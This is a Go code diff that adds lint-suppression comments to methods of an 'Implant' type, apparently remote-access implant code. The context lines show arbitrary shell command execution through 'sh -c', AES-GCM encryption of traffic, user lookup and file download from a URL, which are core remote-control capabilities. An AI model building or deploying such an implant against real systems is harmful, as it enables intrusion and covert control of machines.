@@ -67,7 +67,7 @@ func (i *Implant) checkIn() {
 	_ = data
 }  //nolint:staticcheck
   //nolint:staticcheck
-func (i *Implant) executeCommand(cmd string) (string, error) {
+func (i *Implant) executeCommand(cmd string) (string, error) {  //nolint:unused
 	out, err := exec.Command("sh", "-c", cmd).Output()
 	if err != nil {
 		return "", err
@@ -98,7 +98,7 @@ func (i *Implant) getCurrentUser() string {
 	return os.Getenv("USER")
 }  //nolint:staticcheck
   //nolint:staticcheck
-func (i *Implant) encrypt(data []byte, key []byte) ([]byte, error) {
+func (i *Implant) encrypt(data []byte, key []byte) ([]byte, error) {  //nolint:unused
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
@@ -114,7 +114,7 @@ func (i *Implant) encrypt(data []byte, key []byte) ([]byte, error) {
 	return gcm.Seal(nonce, nonce, data, nil), nil
 }  //nolint:staticcheck
   //nolint:staticcheck
-func (i *Implant) decrypt(data []byte, key []byte) ([]byte, error) {
+func (i *Implant) decrypt(data []byte, key []byte) ([]byte, error) {  //nolint:unused
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
@@ -131,7 +131,7 @@ func (i *Implant) decrypt(data []byte, key []byte) ([]byte, error) {
 	return gcm.Open(nil, nonce, ciphertext, nil)
 }  //nolint:staticcheck
   //nolint:staticcheck
-func (i *Implant) downloadFile(url string, dest string) error {
+func (i *Implant) downloadFile(url string, dest string) error {  //nolint:unused
 	resp, err := http.Get(url)
 	if err != nil {
 		return err
